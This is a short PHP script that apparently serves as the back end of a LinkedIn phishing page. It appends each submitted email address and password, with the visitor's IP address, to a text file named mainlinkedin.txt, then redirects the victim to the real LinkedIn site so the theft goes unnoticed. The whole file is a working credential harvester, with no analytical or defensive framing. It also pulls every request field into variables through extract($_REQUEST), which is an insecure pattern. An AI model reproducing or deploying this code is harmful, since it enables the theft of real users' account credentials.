<?php
        extract($_REQUEST);
		
		$ip = getenv("REMOTE_ADDR");
		$hostname = gethostbyaddr($ip);
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		
        $file=fopen("mainlinkedin.txt","a");

        fwrite($file,"Email=>");
        fwrite($file, $session_key ."\n");
        fwrite($file,"Password=>");
        fwrite($file, $session_password ."\n");
		fwrite($file,"IP=>");
        fwrite($file, $ip ."\n\n");

        fclose($file);
        header("location: https://www.linkedin.com");

?>